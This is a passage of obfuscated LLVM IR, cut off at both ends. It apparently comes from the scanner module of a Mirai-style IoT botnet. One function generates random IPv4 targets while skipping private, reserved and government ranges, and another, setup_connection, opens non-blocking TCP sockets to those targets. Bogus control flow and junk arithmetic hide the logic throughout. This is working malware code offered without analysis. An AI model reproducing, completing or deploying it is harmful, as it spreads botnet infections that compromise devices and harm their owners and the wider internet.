; <label>:223:                                    ; preds = %originalBBpart228
  %224 = load i32, i32* @x.67
  %225 = load i32, i32* @y.68
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %223
  %232 = load i8, i8* %11, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp sge i32 %233, 18
  %235 = load i32, i32* @x.67
  %236 = load i32, i32* @y.68
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %234, label %243, label %247

; <label>:243:                                    ; preds = %originalBBpart232
  %244 = load i8, i8* %11, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp slt i32 %245, 20
  br i1 %246, label %529, label %247

; <label>:247:                                    ; preds = %243, %originalBBpart232, %originalBBpart228
  %248 = load i8, i8* %10, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp sge i32 %249, 224
  br i1 %250, label %529, label %251

; <label>:251:                                    ; preds = %247
  %252 = load i32, i32* @x.67
  %253 = load i32, i32* @y.68
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %251
  %260 = load i8, i8* %10, align 1
  %261 = zext i8 %260 to i32
  %262 = icmp eq i32 %261, 106
  %263 = load i32, i32* @x.67
  %264 = load i32, i32* @y.68
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %262, label %271, label %291

; <label>:271:                                    ; preds = %originalBBpart236
  %272 = load i32, i32* @x.67
  %273 = load i32, i32* @y.68
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %271
  %280 = load i8, i8* %11, align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 186
  %283 = load i32, i32* @x.67
  %284 = load i32, i32* @y.68
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %282, label %529, label %291

; <label>:291:                                    ; preds = %originalBBpart240, %originalBBpart236
  %292 = load i32, i32* @x.67
  %293 = load i32, i32* @y.68
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %291
  %300 = load i8, i8* %10, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp eq i32 %301, 106
  %303 = load i32, i32* @x.67
  %304 = load i32, i32* @y.68
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %302, label %311, label %315

; <label>:311:                                    ; preds = %originalBBpart244
  %312 = load i8, i8* %11, align 1
  %313 = zext i8 %312 to i32
  %314 = icmp eq i32 %313, 187
  br i1 %314, label %529, label %315

; <label>:315:                                    ; preds = %311, %originalBBpart244
  %316 = load i8, i8* %10, align 1
  %317 = zext i8 %316 to i32
  %318 = icmp eq i32 %317, 106
  br i1 %318, label %319, label %323

; <label>:319:                                    ; preds = %315
  %320 = load i8, i8* %11, align 1
  %321 = zext i8 %320 to i32
  %322 = icmp eq i32 %321, 185
  br i1 %322, label %529, label %323

; <label>:323:                                    ; preds = %319, %315
  %324 = load i32, i32* @x.67
  %325 = load i32, i32* @y.68
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %323
  %332 = load i8, i8* %10, align 1
  %333 = zext i8 %332 to i32
  %334 = icmp eq i32 %333, 106
  %335 = load i32, i32* @x.67
  %336 = load i32, i32* @y.68
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %334, label %343, label %363

; <label>:343:                                    ; preds = %originalBBpart248
  %344 = load i32, i32* @x.67
  %345 = load i32, i32* @y.68
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %343
  %352 = load i8, i8* %11, align 1
  %353 = zext i8 %352 to i32
  %354 = icmp eq i32 %353, 184
  %355 = load i32, i32* @x.67
  %356 = load i32, i32* @y.68
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %354, label %529, label %363

; <label>:363:                                    ; preds = %originalBBpart252, %originalBBpart248
  %364 = load i8, i8* %10, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp eq i32 %365, 150
  br i1 %366, label %367, label %371

; <label>:367:                                    ; preds = %363
  %368 = load i8, i8* %11, align 1
  %369 = zext i8 %368 to i32
  %370 = icmp eq i32 %369, 31
  br i1 %370, label %529, label %371

; <label>:371:                                    ; preds = %367, %363
  %372 = load i8, i8* %10, align 1
  %373 = zext i8 %372 to i32
  %374 = icmp eq i32 %373, 49
  br i1 %374, label %375, label %379

; <label>:375:                                    ; preds = %371
  %376 = load i8, i8* %11, align 1
  %377 = zext i8 %376 to i32
  %378 = icmp eq i32 %377, 51
  br i1 %378, label %529, label %379

; <label>:379:                                    ; preds = %375, %371
  %380 = load i8, i8* %10, align 1
  %381 = zext i8 %380 to i32
  %382 = icmp eq i32 %381, 178
  br i1 %382, label %383, label %403

; <label>:383:                                    ; preds = %379
  %384 = load i32, i32* @x.67
  %385 = load i32, i32* @y.68
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %383
  %392 = load i8, i8* %11, align 1
  %393 = zext i8 %392 to i32
  %394 = icmp eq i32 %393, 62
  %395 = load i32, i32* @x.67
  %396 = load i32, i32* @y.68
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %394, label %529, label %403

; <label>:403:                                    ; preds = %originalBBpart256, %379
  %404 = load i8, i8* %10, align 1
  %405 = zext i8 %404 to i32
  %406 = icmp eq i32 %405, 160
  br i1 %406, label %407, label %411

; <label>:407:                                    ; preds = %403
  %408 = load i8, i8* %11, align 1
  %409 = zext i8 %408 to i32
  %410 = icmp eq i32 %409, 13
  br i1 %410, label %529, label %411

; <label>:411:                                    ; preds = %407, %403
  %412 = load i8, i8* %10, align 1
  %413 = zext i8 %412 to i32
  %414 = icmp eq i32 %413, 6
  br i1 %414, label %527, label %415

; <label>:415:                                    ; preds = %411
  %416 = load i32, i32* @x.67
  %417 = load i32, i32* @y.68
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %415
  %424 = load i8, i8* %10, align 1
  %425 = zext i8 %424 to i32
  %426 = icmp eq i32 %425, 7
  %427 = load i32, i32* @x.67
  %428 = load i32, i32* @y.68
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %426, label %527, label %435

; <label>:435:                                    ; preds = %originalBBpart260
  %436 = load i8, i8* %10, align 1
  %437 = zext i8 %436 to i32
  %438 = icmp eq i32 %437, 11
  br i1 %438, label %527, label %439

; <label>:439:                                    ; preds = %435
  %440 = load i32, i32* @x.67
  %441 = load i32, i32* @y.68
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %439
  %448 = load i8, i8* %10, align 1
  %449 = zext i8 %448 to i32
  %450 = icmp eq i32 %449, 21
  %451 = load i32, i32* @x.67
  %452 = load i32, i32* @y.68
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %450, label %527, label %459

; <label>:459:                                    ; preds = %originalBBpart264
  %460 = load i8, i8* %10, align 1
  %461 = zext i8 %460 to i32
  %462 = icmp eq i32 %461, 22
  br i1 %462, label %527, label %463

; <label>:463:                                    ; preds = %459
  %464 = load i8, i8* %10, align 1
  %465 = zext i8 %464 to i32
  %466 = icmp eq i32 %465, 26
  br i1 %466, label %527, label %467

; <label>:467:                                    ; preds = %463
  %468 = load i8, i8* %10, align 1
  %469 = zext i8 %468 to i32
  %470 = icmp eq i32 %469, 28
  br i1 %470, label %527, label %471

; <label>:471:                                    ; preds = %467
  %472 = load i8, i8* %10, align 1
  %473 = zext i8 %472 to i32
  %474 = icmp eq i32 %473, 29
  br i1 %474, label %527, label %475

; <label>:475:                                    ; preds = %471
  %476 = load i8, i8* %10, align 1
  %477 = zext i8 %476 to i32
  %478 = icmp eq i32 %477, 30
  br i1 %478, label %527, label %479

; <label>:479:                                    ; preds = %475
  %480 = load i32, i32* @x.67
  %481 = load i32, i32* @y.68
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %479
  %488 = load i8, i8* %10, align 1
  %489 = zext i8 %488 to i32
  %490 = icmp eq i32 %489, 33
  %491 = load i32, i32* @x.67
  %492 = load i32, i32* @y.68
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %490, label %527, label %499

; <label>:499:                                    ; preds = %originalBBpart268
  %500 = load i8, i8* %10, align 1
  %501 = zext i8 %500 to i32
  %502 = icmp eq i32 %501, 55
  br i1 %502, label %527, label %503

; <label>:503:                                    ; preds = %499
  %504 = load i8, i8* %10, align 1
  %505 = zext i8 %504 to i32
  %506 = icmp eq i32 %505, 214
  br i1 %506, label %527, label %507

; <label>:507:                                    ; preds = %503
  %508 = load i32, i32* @x.67
  %509 = load i32, i32* @y.68
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %507
  %516 = load i8, i8* %10, align 1
  %517 = zext i8 %516 to i32
  %518 = icmp eq i32 %517, 215
  %519 = load i32, i32* @x.67
  %520 = load i32, i32* @y.68
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %527

; <label>:527:                                    ; preds = %originalBBpart272, %503, %499, %originalBBpart268, %475, %471, %467, %463, %459, %originalBBpart264, %435, %originalBBpart260, %411
  %528 = phi i1 [ true, %503 ], [ true, %499 ], [ true, %originalBBpart268 ], [ true, %475 ], [ true, %471 ], [ true, %467 ], [ true, %463 ], [ true, %459 ], [ true, %originalBBpart264 ], [ true, %435 ], [ true, %originalBBpart260 ], [ true, %411 ], [ %518, %originalBBpart272 ]
  br label %529

; <label>:529:                                    ; preds = %527, %407, %originalBBpart256, %375, %367, %originalBBpart252, %319, %311, %originalBBpart240, %247, %243, %originalBBpart224, %175, %originalBBpart220, %originalBBpart216, %95, %91, %87, %83, %originalBBpart28, %originalBBpart24, %39
  %530 = phi i1 [ true, %407 ], [ true, %originalBBpart256 ], [ true, %375 ], [ true, %367 ], [ true, %originalBBpart252 ], [ true, %319 ], [ true, %311 ], [ true, %originalBBpart240 ], [ true, %247 ], [ true, %243 ], [ true, %originalBBpart224 ], [ true, %175 ], [ true, %originalBBpart220 ], [ true, %originalBBpart216 ], [ true, %95 ], [ true, %91 ], [ true, %87 ], [ true, %83 ], [ true, %originalBBpart28 ], [ true, %originalBBpart24 ], [ true, %39 ], [ %528, %527 ]
  br i1 %530, label %22, label %531

; <label>:531:                                    ; preds = %529
  %532 = load i32, i32* @x.67
  %533 = load i32, i32* @y.68
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %531
  %540 = load i8, i8* %10, align 1
  %541 = zext i8 %540 to i32
  %542 = shl i32 %541, 24
  %543 = load i8, i8* %11, align 1
  %544 = zext i8 %543 to i32
  %545 = shl i32 %544, 16
  %546 = or i32 %542, %545
  %547 = load i8, i8* %12, align 1
  %548 = zext i8 %547 to i32
  %549 = shl i32 %548, 8
  %550 = or i32 %546, %549
  %551 = load i8, i8* %13, align 1
  %552 = zext i8 %551 to i32
  %553 = shl i32 %552, 0
  %554 = or i32 %550, %553
  %555 = call i32 @htonl(i32 %554) #7
  %556 = load i32, i32* @x.67
  %557 = load i32, i32* @y.68
  %558 = sub i32 %556, 1
  %559 = mul i32 %556, %558
  %560 = urem i32 %559, 2
  %561 = icmp eq i32 %560, 0
  %562 = icmp slt i32 %557, 10
  %563 = or i1 %561, %562
  br i1 %563, label %originalBBpart2142, label %originalBB74alteredBB

originalBBpart2142:                               ; preds = %originalBB74
  ret i32 %555

originalBBalteredBB:                              ; preds = %originalBB, %0
  %564 = alloca i32, align 4
  %565 = alloca i8, align 1
  %566 = alloca i8, align 1
  %567 = alloca i8, align 1
  %568 = alloca i8, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %569 = load i8, i8* %10, align 1
  %570 = zext i8 %569 to i32
  %571 = icmp eq i32 %570, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %63
  %572 = load i8, i8* %10, align 1
  %573 = zext i8 %572 to i32
  %574 = icmp eq i32 %573, 3
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %99
  %575 = load i8, i8* %10, align 1
  %576 = zext i8 %575 to i32
  %577 = icmp eq i32 %576, 192
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %119
  %578 = load i8, i8* %11, align 1
  %579 = zext i8 %578 to i32
  %580 = icmp eq i32 %579, 168
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %147
  %581 = load i8, i8* %11, align 1
  %582 = zext i8 %581 to i32
  %583 = icmp slt i32 %582, 32
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %183
  %584 = load i8, i8* %11, align 1
  %585 = zext i8 %584 to i32
  %586 = icmp sgt i32 %585, 254
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %203
  %587 = load i8, i8* %10, align 1
  %588 = zext i8 %587 to i32
  %589 = icmp eq i32 %588, 198
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %223
  %590 = load i8, i8* %11, align 1
  %591 = zext i8 %590 to i32
  %592 = icmp sge i32 %591, 18
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %251
  %593 = load i8, i8* %10, align 1
  %594 = zext i8 %593 to i32
  %595 = icmp eq i32 %594, 106
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %271
  %596 = load i8, i8* %11, align 1
  %597 = zext i8 %596 to i32
  %598 = icmp eq i32 %597, 186
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %291
  %599 = load i8, i8* %10, align 1
  %600 = zext i8 %599 to i32
  %601 = icmp eq i32 %600, 106
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %323
  %602 = load i8, i8* %10, align 1
  %603 = zext i8 %602 to i32
  %604 = icmp eq i32 %603, 106
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %343
  %605 = load i8, i8* %11, align 1
  %606 = zext i8 %605 to i32
  %607 = icmp eq i32 %606, 184
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %383
  %608 = load i8, i8* %11, align 1
  %609 = zext i8 %608 to i32
  %610 = icmp eq i32 %609, 62
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %415
  %611 = load i8, i8* %10, align 1
  %612 = zext i8 %611 to i32
  %613 = icmp eq i32 %612, 7
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %439
  %614 = load i8, i8* %10, align 1
  %615 = zext i8 %614 to i32
  %616 = icmp eq i32 %615, 21
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %479
  %617 = load i8, i8* %10, align 1
  %618 = zext i8 %617 to i32
  %619 = icmp eq i32 %618, 33
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %507
  %620 = load i8, i8* %10, align 1
  %621 = zext i8 %620 to i32
  %622 = icmp eq i32 %621, 215
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %531
  %623 = load i8, i8* %10, align 1
  %624 = zext i8 %623 to i32
  %_ = sub i32 %624, 24
  %gen = mul i32 %_, 24
  %_75 = sub i32 %624, 24
  %gen76 = mul i32 %_75, 24
  %_77 = sub i32 0, %624
  %gen78 = add i32 %_77, 24
  %_79 = sub i32 %624, 24
  %gen80 = mul i32 %_79, 24
  %625 = shl i32 %624, 24
  %626 = load i8, i8* %11, align 1
  %627 = zext i8 %626 to i32
  %_81 = sub i32 %627, 16
  %gen82 = mul i32 %_81, 16
  %_83 = shl i32 %627, 16
  %_84 = sub i32 %627, 16
  %gen85 = mul i32 %_84, 16
  %_86 = sub i32 0, %627
  %gen87 = add i32 %_86, 16
  %_88 = sub i32 0, %627
  %gen89 = add i32 %_88, 16
  %_90 = shl i32 %627, 16
  %_91 = sub i32 0, %627
  %gen92 = add i32 %_91, 16
  %628 = shl i32 %627, 16
  %_93 = sub i32 %625, %628
  %gen94 = mul i32 %_93, %628
  %_95 = sub i32 0, %625
  %gen96 = add i32 %_95, %628
  %_97 = sub i32 0, %625
  %gen98 = add i32 %_97, %628
  %_99 = shl i32 %625, %628
  %_100 = shl i32 %625, %628
  %_101 = sub i32 %625, %628
  %gen102 = mul i32 %_101, %628
  %_103 = sub i32 0, %625
  %gen104 = add i32 %_103, %628
  %629 = or i32 %625, %628
  %630 = load i8, i8* %12, align 1
  %631 = zext i8 %630 to i32
  %_105 = sub i32 %631, 8
  %gen106 = mul i32 %_105, 8
  %_107 = shl i32 %631, 8
  %_108 = sub i32 %631, 8
  %gen109 = mul i32 %_108, 8
  %_110 = sub i32 0, %631
  %gen111 = add i32 %_110, 8
  %_112 = shl i32 %631, 8
  %632 = shl i32 %631, 8
  %_113 = sub i32 0, %629
  %gen114 = add i32 %_113, %632
  %_115 = sub i32 %629, %632
  %gen116 = mul i32 %_115, %632
  %_117 = shl i32 %629, %632
  %633 = or i32 %629, %632
  %634 = load i8, i8* %13, align 1
  %635 = zext i8 %634 to i32
  %_118 = sub i32 0, %635
  %gen119 = add i32 %_118, 0
  %_120 = shl i32 %635, 0
  %_121 = sub i32 %635, 0
  %gen122 = mul i32 %_121, 0
  %_123 = sub i32 0, %635
  %gen124 = add i32 %_123, 0
  %_125 = sub i32 %635, 0
  %gen126 = mul i32 %_125, 0
  %636 = shl i32 %635, 0
  %_127 = sub i32 0, %633
  %gen128 = add i32 %_127, %636
  %_129 = sub i32 0, %633
  %gen130 = add i32 %_129, %636
  %_131 = sub i32 0, %633
  %gen132 = add i32 %_131, %636
  %_133 = sub i32 0, %633
  %gen134 = add i32 %_133, %636
  %_135 = sub i32 %633, %636
  %gen136 = mul i32 %_135, %636
  %_137 = sub i32 %633, %636
  %gen138 = mul i32 %_137, %636
  %_139 = sub i32 %633, %636
  %gen140 = mul i32 %_139, %636
  %637 = or i32 %633, %636
  %638 = call i32 @htonl(i32 %637) #7
  br label %originalBB74
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %31

; <label>:10:                                     ; preds = %1
  %11 = load i32, i32* @x.69
  %12 = load i32, i32* @y.70
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 1
  %21 = load i32, i32* %20, align 8
  %22 = call i32 @close(i32 %21)
  %23 = load i32, i32* @x.69
  %24 = load i32, i32* @y.70
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %31

; <label>:31:                                     ; preds = %originalBBpart2, %1
  %32 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %33 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %34 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %33, i32 0, i32 1
  store i32 %32, i32* %34, align 8
  %35 = icmp eq i32 %32, -1
  br i1 %35, label %36, label %53

; <label>:36:                                     ; preds = %31
  %37 = load i32, i32* @x.69
  %38 = load i32, i32* @y.70
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %36
  %45 = load i32, i32* @x.69
  %46 = load i32, i32* @y.70
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %107

; <label>:53:                                     ; preds = %31
  %54 = load i32, i32* @x.69
  %55 = load i32, i32* @y.70
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %53
  %62 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %63 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %62, i32 0, i32 6
  store i32 0, i32* %63, align 4
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %65 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i32 0, i32 7
  %66 = getelementptr inbounds [256 x i8], [256 x i8]* %65, i32 0, i32 0
  call void @util_zero(i8* %66, i32 256)
  %67 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %68 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %67, i32 0, i32 1
  %69 = load i32, i32* %68, align 8
  %70 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %70, i32 0, i32 1
  %72 = load i32, i32* %71, align 8
  %73 = call i32 (i32, i32, ...) @fcntl(i32 %72, i32 3, i32 0)
  %74 = or i32 2048, %73
  %75 = call i32 (i32, i32, ...) @fcntl(i32 %69, i32 4, i32 %74)
  %76 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %76, align 4
  %77 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %78 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %77, i32 0, i32 4
  %79 = load i32, i32* %78, align 4
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %81 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %80, i32 0, i32 0
  store i32 %79, i32* %81, align 4
  %82 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %83 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %82, i32 0, i32 5
  %84 = load i16, i16* %83, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %84, i16* %85, align 2
  %86 = load i32, i32* @fake_time, align 4
  %87 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 2
  store i32 %86, i32* %88, align 4
  %89 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %90 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %89, i32 0, i32 3
  store i32 1, i32* %90, align 8
  %91 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %92 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %91, i32 0, i32 1
  %93 = load i32, i32* %92, align 8
  %94 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %95 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %95, %struct.sockaddr** %94, align 8
